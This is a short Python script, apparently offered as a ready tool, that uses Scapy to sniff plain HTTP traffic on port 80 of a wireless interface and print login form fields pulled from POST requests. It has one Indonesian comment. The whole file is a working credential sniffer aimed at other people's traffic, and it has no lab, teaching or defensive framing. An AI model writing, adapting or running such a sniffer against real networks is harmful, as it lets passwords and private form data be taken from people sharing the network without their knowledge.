from scapy.all import TCP, sniff, Raw

def extract_credentials(payload):
    credentials = {}
    # Split the payload into key-value pairs
    pairs = payload.split('&')
    for pair in pairs:
        if '=' in pair:
            key, value = pair.split('=', 1)
            credentials[key] = value
    return credentials

def handle_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        payload = packet[Raw].load.decode('utf-8', 'ignore')
        if "POST" in payload and "HTTP" in payload:
            print("Captured HTTP payload:")
            print(payload)
            print("Extracted credentials:")
            credentials = extract_credentials(payload)
            for key, value in credentials.items():
                print(f"{key}: {value}")

# Menjalankan sniffer
sniff(filter="tcp port 80", prn=handle_packet, iface="wlan0")
